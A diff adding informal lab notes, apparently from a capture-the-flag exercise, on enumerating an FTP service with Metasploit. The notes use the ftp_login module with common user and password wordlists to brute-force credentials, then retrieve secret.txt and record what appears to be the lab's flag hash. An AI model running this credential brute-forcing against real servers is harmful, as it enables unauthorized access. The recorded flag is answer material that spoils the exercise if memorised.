@@ -3,3 +3,14 @@ Ftp stands for file transfer protocol
 ftp transfer files to and from the directory of a webserver.
 
 msf6> search type:auxiliary name:ftp
+seacrh for the ftp version //cause if we know the version we can know which attack we can do
+then in Enumeration part we wont do exploitation so try for ftp login
+search ftp_login
+use and give the User file.txt and pass filetxt
+in metaspolit 
+set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set pass_file /usr/share/metasploit-framework/data/wordlists/unixpass.txt
+run
+you will get the username and passwords
+get the secret.txt
+260ca9dd8a4577fc00b7bd5810298076
